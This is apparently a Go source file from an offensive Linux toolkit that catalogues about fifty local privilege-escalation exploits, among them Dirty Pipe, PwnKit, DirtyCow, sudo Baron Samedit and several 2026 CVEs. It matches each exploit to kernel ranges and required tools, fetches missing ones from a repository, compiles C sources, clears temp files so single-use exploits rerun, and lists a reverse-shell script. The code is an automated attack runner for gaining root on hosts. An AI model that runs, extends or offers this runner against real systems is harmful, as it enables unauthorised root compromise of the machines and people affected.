package main

import (
	"fmt"
	"os"
	"path/filepath"
)

// exploitKind tells the runner how to launch an exploit.
type exploitKind int

const (
	kindBinary  exploitKind = iota // static ELF, run directly
	kindScript                      // python3 / perl / bash script
	kindCompile                     // .c source, needs gcc+libs, compile then run
	kindCopyfail                    // copyfail.py derivative (sed-replace target binary)
	kindDir                        // a directory exploit (e.g. cloned CVE repo)
)

// Exploit is one entry in the toolkit's catalog.
type Exploit struct {
	Name    string
	Kind    exploitKind
	Path    string // file or dir path relative to the toolkit dir
	Args    []string
	Lo, Hi  [3]int // kernel range; [3]int{} means unbounded on that side
	Desc    string
	Needs   []string // required host tools (e.g. "gcc", "python3")
	Timeout int      // seconds; 0 = use default
	NoRoot  bool     // true = never auto-spawn shell (e.g. mass-shell-injection)
	// Cleanup is a list of temp file/dir patterns to remove BEFORE running
	// this exploit. Many exploits are single-use: they create temp files
	// (e.g. /tmp/loader, /var/tmp/.s) and FAIL if those files already exist
	// from a previous run. Cleaning them first makes re-runs work.
	Cleanup []string
}

// defaultTimeout used when Exploit.Timeout == 0.
const defaultTimeout = 45

// registry returns the catalog. Paths are relative to the toolkit dir so
// that shipping the runner + exploits together "just works". Any missing
// file is skipped at runtime, so the catalog is deliberately comprehensive.
func registry() []Exploit {
	var z [3]int
	return []Exploit{
		// ── 2026 kernel LPEs (broad coverage) ──────────────────────────────
		{Name: "copyfail-go-static", Kind: kindBinary, Path: "copyfail-go-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "CVE-2026-31431 Go impl (page-cache patch)", Timeout: 60},
		{Name: "dirtyfrag-static", Kind: kindBinary, Path: "dirtyfrag-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "DirtyFrag heap spray LPE"},
		{Name: "fragnesia-static", Kind: kindBinary, Path: "fragnesia-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "Fragnesia netfilter frag LPE"},
		{Name: "fragnesia2-static", Kind: kindBinary, Path: "fragnesia2-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "Fragnesia v2"},
		{Name: "dirtydecrypt-static", Kind: kindBinary, Path: "dirtydecrypt-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "DirtyDecrypt LPE"},
		{Name: "pintheft-static", Kind: kindBinary, Path: "pintheft-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "PIN theft LPE"},
		{Name: "cifswitch-static", Kind: kindBinary, Path: "cifswitch-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "cifswitch LPE",
			Cleanup: []string{"/tmp/cifswitch_*", "/var/tmp/cifswitch_rootsh"}},
		{Name: "pidfd-race-static", Kind: kindBinary, Path: "pidfd-race-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "pidfd race LPE"},
		{Name: "packet-edit-meme-static", Kind: kindBinary, Path: "packet-edit-meme-static", Lo: [3]int{5, 18, 0}, Hi: [3]int{7, 1, 99}, Desc: "packet edit mem LPE"},
		{Name: "dirtyclone-static", Kind: kindBinary, Path: "dirtyclone-static", Lo: [3]int{7, 0, 0}, Hi: [3]int{7, 1, 99}, Desc: "CVE-2026-43503 DirtyClone"},
		{Name: "bad-epoll-static", Kind: kindBinary, Path: "bad-epoll-static", Lo: [3]int{6, 12, 0}, Hi: [3]int{6, 12, 99}, Desc: "bad epoll LPE"},
		{Name: "fuse-oob-static", Kind: kindBinary, Path: "fuse-oob-static", Lo: [3]int{6, 15, 0}, Hi: z, Desc: "Fuse OOB LPE", Needs: []string{"fusermount"}},
		{Name: "ipv6-frag-escape-static", Kind: kindBinary, Path: "ipv6-frag-escape-static", Lo: [3]int{6, 12, 0}, Hi: [3]int{6, 12, 99}, Desc: "IPv6 frag escape"},
		{Name: "nft-uaf-static", Kind: kindBinary, Path: "nft-uaf-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{6, 99, 0}, Desc: "nft UAF LPE"},
		{Name: "nft-uaf2-static", Kind: kindBinary, Path: "nft-uaf2-static", Lo: [3]int{5, 0, 0}, Hi: [3]int{5, 18, 0}, Desc: "nft UAF v2 LPE"},
		{Name: "netfilter-oob-static", Kind: kindBinary, Path: "netfilter-oob-static", Lo: [3]int{2, 6, 19}, Hi: [3]int{5, 12, 0}, Desc: "Netfilter OOB"},
		{Name: "proc_readdir_de", Kind: kindBinary, Path: "proc_readdir_de", Lo: z, Hi: z, Desc: "proc readdir LPE"},

		// ── 2022-2024 ───────────────────────────────────────────────────────
		{Name: "dirtypipe-static", Kind: kindBinary, Path: "dirtypipe-static", Lo: [3]int{5, 8, 0}, Hi: [3]int{5, 16, 11}, Desc: "CVE-2022-0847 Dirty Pipe"},
		{Name: "overlayfs-static", Kind: kindBinary, Path: "overlayfs-static", Lo: [3]int{3, 0, 0}, Hi: [3]int{5, 11, 0}, Desc: "CVE-2021-3493 OverlayFS"},
		{Name: "ovfs-fuse-static", Kind: kindBinary, Path: "ovfs-fuse-static", Lo: [3]int{5, 11, 0}, Hi: z, Desc: "OverlayFS FUSE LPE"},

		// ── Service / polkit / docker ───────────────────────────────────────
		{Name: "pwnkit-new-static", Kind: kindBinary, Path: "pwnkit-new-static", Lo: z, Hi: z, Desc: "CVE-2021-4034 PwnKit", Timeout: 30},
		{Name: "pack2theroot-static", Kind: kindBinary, Path: "pack2theroot-static", Lo: z, Hi: z, Desc: "CVE-2026-41651 PackageKit TOCTOU", Timeout: 90,
			Cleanup: []string{"/tmp/.skp-dummy-*.deb", "/tmp/.skp-payload-*.deb", "/var/tmp/.suid_bash"}},
		{Name: "polkit-dbus-static", Kind: kindBinary, Path: "polkit-dbus-static", Lo: z, Hi: z, Desc: "Polkit D-Bus LPE"},
		{Name: "docker-sock-static", Kind: kindBinary, Path: "docker-sock-static", Lo: z, Hi: z, Desc: "Docker socket LPE"},

		// ── Distro-specific prebuilt binaries ───────────────────────────────
		{Name: "cve-2026-41651-almalinux8", Kind: kindBinary, Path: "cve-2026-41651-almalinux8", Lo: z, Hi: z, Desc: "CVE-2026-41651 AlmaLinux8 build", Timeout: 90},
		{Name: "debian11-xpl2026", Kind: kindBinary, Path: "debian11-xpl2026", Lo: [3]int{5, 10, 0}, Hi: [3]int{5, 10, 99}, Desc: "Debian11 2026 LPE"},
		{Name: "CVE-2025-21756", Kind: kindBinary, Path: "CVE-2025-21756", Lo: z, Hi: z, Desc: "CVE-2025-21756 LPE"},
		{Name: "exp", Kind: kindBinary, Path: "exp", Lo: z, Hi: z, Desc: "Generic exp binary"},
		{Name: "exploit", Kind: kindBinary, Path: "exploit", Lo: z, Hi: z, Desc: "Generic exploit binary",
			Cleanup: []string{"/tmp/loader", "/var/tmp/.s", "/tmp/snap.bin"}},
		{Name: "PwnKit", Kind: kindBinary, Path: "PwnKit", Lo: z, Hi: z, Desc: "PwnKit (downloaded)"},
		{Name: "pwnkit2", Kind: kindBinary, Path: "pwnkit2", Lo: z, Hi: z, Desc: "PwnKit variant 2"},
		{Name: "pwnkitt", Kind: kindBinary, Path: "pwnkitt", Lo: z, Hi: z, Desc: "PwnKit variant t",
			Cleanup: []string{"/tmp/.pk-dummy-*.deb", "/tmp/.pk-payload-*.deb", "/tmp/.suid_bash"}},
		{Name: "copyfail_binsu", Kind: kindBinary, Path: "copyfail_binsu", Lo: [3]int{5, 4, 0}, Hi: [3]int{6, 1, 99}, Desc: "CVE-2026-31431 copyfail /bin/su variant"},
		{Name: "copyfail_mu", Kind: kindBinary, Path: "copyfail_mu", Lo: [3]int{5, 4, 0}, Hi: [3]int{6, 1, 99}, Desc: "CVE-2026-31431 copyfail multi variant"},
		{Name: "copyfail_su", Kind: kindBinary, Path: "copyfail_su", Lo: [3]int{5, 4, 0}, Hi: [3]int{6, 1, 99}, Desc: "CVE-2026-31431 copyfail su variant"},
		{Name: "dirtypi", Kind: kindBinary, Path: "dirtypi", Lo: z, Hi: z, Desc: "DirtyPi LPE"},
		{Name: "overlay", Kind: kindBinary, Path: "overlay", Lo: z, Hi: z, Desc: "overlay (compiled)"},
		{Name: "2025mod", Kind: kindBinary, Path: "2025mod", Lo: z, Hi: z, Desc: "2025 mod LPE", Timeout: 120},

		// ── Scripts ─────────────────────────────────────────────────────────
		{Name: "copyfail.py", Kind: kindScript, Path: "copyfail.py", Args: []string{"python3"}, Lo: z, Hi: z, Desc: "CVE-2026-31431 copyfail.py (su)", Needs: []string{"python3"}},
		{Name: "copy_fail_exp-2.py", Kind: kindScript, Path: "copy_fail_exp-2.py", Args: []string{"python3"}, Lo: z, Hi: z, Desc: "copyfail exp v2", Needs: []string{"python3"}},
		{Name: "exp.py", Kind: kindScript, Path: "exp.py", Args: []string{"python3"}, Lo: z, Hi: z, Desc: "copyfail minified", Needs: []string{"python3"}},
		{Name: "CVE-2026-46300.py", Kind: kindScript, Path: "CVE-2026-46300.py", Args: []string{"python3"}, Lo: z, Hi: z, Desc: "CVE-2026-46300", Needs: []string{"python3"}},
		{Name: "gameover.sh", Kind: kindScript, Path: "gameover.sh", Args: []string{"bash"}, Lo: [3]int{5, 11, 0}, Hi: [3]int{5, 19, 0}, Desc: "GameOver(lay) CVE-2023-2640/3262"},
		{Name: "autoroot.pl", Kind: kindScript, Path: "autoroot.pl", Args: []string{"perl"}, Lo: z, Hi: z, Desc: "autoroot.pl phases", NoRoot: true},
		{Name: "reverse.pl", Kind: kindScript, Path: "reverse.pl", Args: []string{"perl"}, Lo: z, Hi: z, Desc: "reverse shell (skip by default)", NoRoot: true},
		{Name: "CVE-2021-3156", Kind: kindScript, Path: "CVE-2021-3156.py", Args: []string{"python3"}, Lo: z, Hi: z, Desc: "CVE-2021-3156 sudo Baron Samedit", Needs: []string{"python3"}},
		{Name: "CVE-2025-32463", Kind: kindScript, Path: "CVE-2025-32463.sh", Args: []string{"bash"}, Lo: z, Hi: z, Desc: "CVE-2025-32463 sudo chroot chwoot", Needs: []string{"gcc"}},

		// ── C sources requiring compile ─────────────────────────────────────
		{Name: "dirty.c", Kind: kindCompile, Path: "dirty.c", Lo: [3]int{2, 6, 22}, Hi: [3]int{4, 99, 0}, Desc: "DirtyCow CVE-2016-5195", Needs: []string{"gcc"}, Timeout: 90},
		{Name: "dirty2.c", Kind: kindCompile, Path: "dirty2.c", Lo: [3]int{2, 6, 22}, Hi: [3]int{4, 99, 0}, Desc: "DirtyCow variant", Needs: []string{"gcc"}, Timeout: 90},
		{Name: "42887.c", Kind: kindCompile, Path: "42887.c", Lo: [3]int{3, 10, 0}, Hi: [3]int{3, 10, 99}, Desc: "CVE-2017-1000253 PIE", Needs: []string{"gcc"}, Timeout: 90},
		{Name: "copy_fail.exp.c", Kind: kindCompile, Path: "copy_fail.exp.c", Lo: z, Hi: z, Desc: "copyfail C variant", Needs: []string{"gcc"}, Timeout: 90},

		// ── Directory exploits (git-cloned CVE repos) ───────────────────────
		{Name: "CVE-2026-41651", Kind: kindDir, Path: "CVE-2026-41651", Lo: z, Hi: z, Desc: "PackageKit TOCTOU (src + make)", Needs: []string{"gcc", "make"}, Timeout: 120},
		{Name: "CVE-2026-41651-v2", Kind: kindDir, Path: "CVE-2026-41651-v2", Lo: z, Hi: z, Desc: "PackageKit TOCTOU v2 (py+sh)", Needs: []string{"python3"}, Timeout: 120},
	}
}

// listCmd prints the catalog in a table, with per-row applicability.
func listCmd() {
	exploits := registry()
	fmt.Println()
	headf("Exploit Catalog (%d entries)", len(exploits))
	fmt.Printf("  %-28s %-7s %-9s %s\n", "Name", "Kind", "Kernel", "Description")
	fmt.Println("  " + repeat("-", 74))
	for _, e := range exploits {
		kr := "any"
		if e.Lo != [3]int{} || e.Hi != [3]int{} {
			kr = fmt.Sprintf("%d.%d.%d-%d.%d.%d", e.Lo[0], e.Lo[1], e.Lo[2], e.Hi[0], e.Hi[1], e.Hi[2])
			if e.Lo == [3]int{} {
				kr = fmt.Sprintf("≤%d.%d.%d", e.Hi[0], e.Hi[1], e.Hi[2])
			} else if e.Hi == [3]int{} {
				kr = fmt.Sprintf("≥%d.%d.%d", e.Lo[0], e.Lo[1], e.Lo[2])
			}
		}
		fmt.Printf("  %-28s %-7s %-9s %s\n", e.Name, kindLabel(e.Kind), kr, e.Desc)
	}
	fmt.Println()
}

func kindLabel(k exploitKind) string {
	switch k {
	case kindBinary:
		return "bin"
	case kindScript:
		return "scr"
	case kindCompile:
		return "c→bin"
	case kindCopyfail:
		return "cf"
	case kindDir:
		return "dir"
	}
	return "?"
}

func repeat(s string, n int) string {
	if n <= 0 {
		return ""
	}
	out := make([]byte, 0, n*len(s))
	for i := 0; i < n; i++ {
		out = append(out, s...)
	}
	return string(out)
}

// exists reports whether the exploit's file/dir is present locally or can be
// fetched from the GitHub repo.
func (e *Exploit) exists() bool {
	return ensureFile(e.Path, e.Kind == kindDir)
}

// missingTools returns the list of required tools not found on PATH.
func (e *Exploit) missingTools() []string {
	var miss []string
	for _, t := range e.Needs {
		if !hasBin(t) {
			miss = append(miss, t)
		}
	}
	return miss
}

// eligible reports whether an exploit should be attempted given the host's
// kernel and tools. Reasons are returned for logging.
func (e *Exploit) eligible(s *systemInfo) (bool, string) {
	if !e.inRange(s) {
		return false, "kernel out of range"
	}
	if miss := e.missingTools(); len(miss) > 0 {
		return false, "missing tools: " + join(miss, ",")
	}
	return true, ""
}

func (e *Exploit) inRange(s *systemInfo) bool {
	if e.Lo != [3]int{} || e.Hi != [3]int{} {
		return s.inRange(e.Lo, e.Hi)
	}
	return true
}

func join(ss []string, sep string) string {
	if len(ss) == 0 {
		return ""
	}
	out := ss[0]
	for _, x := range ss[1:] {
		out += sep + x
	}
	return out
}

// buildArgv constructs the command vector for launching one exploit.
func (e *Exploit) buildArgv() ([]string, string) {
	p := absBin(e.Path)
	switch e.Kind {
	case kindBinary, kindDir:
		// For directories we try a prebuilt binary named like the dir,
		// otherwise the runner compiles inside the dir (handled in runOne).
		if e.Kind == kindDir {
			// Try to find a ready binary inside the dir.
			if b := findDirBinary(p); b != "" {
				return []string{b}, p
			}
			return nil, p
		}
		return []string{p}, ""
	case kindScript:
		// Ensure the script is executable.
		_ = os.Chmod(p, 0o755)
		if len(e.Args) > 0 {
			return append(e.Args, p), ""
		}
		return []string{p}, ""
	case kindCompile:
		// Compiled at run time; the binary path is decided in runOne.
		return nil, ""
	case kindCopyfail:
		return []string{"python3", p}, ""
	}
	return nil, ""
}

// findDirBinary looks for an executable inside a CVE directory that is
// not the source. Prefers names matching the dir, then any +x file.
func findDirBinary(dir string) string {
	ents, err := os.ReadDir(dir)
	if err != nil {
		return ""
	}
	base := filepath.Base(dir)
	// 1. exact-name match
	for _, ent := range ents {
		if ent.IsDir() {
			continue
		}
		if ent.Name() == base || ent.Name() == "exploit" || ent.Name() == "exp" {
			full := filepath.Join(dir, ent.Name())
			if isExec(full) {
				return full
			}
		}
	}
	// 2. any executable file (not .c/.py/.sh)
	for _, ent := range ents {
		if ent.IsDir() {
			continue
		}
		name := ent.Name()
		if hasSuffix(name, ".c") || hasSuffix(name, ".py") || hasSuffix(name, ".sh") || hasSuffix(name, ".md") {
			continue
		}
		full := filepath.Join(dir, name)
		if isExec(full) {
			return full
		}
	}
	return ""
}

func isExec(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	return fi.Mode()&0o111 != 0 && !fi.IsDir()
}

func hasSuffix(s, suf string) bool {
	return len(s) >= len(suf) && s[len(s)-len(suf):] == suf
}
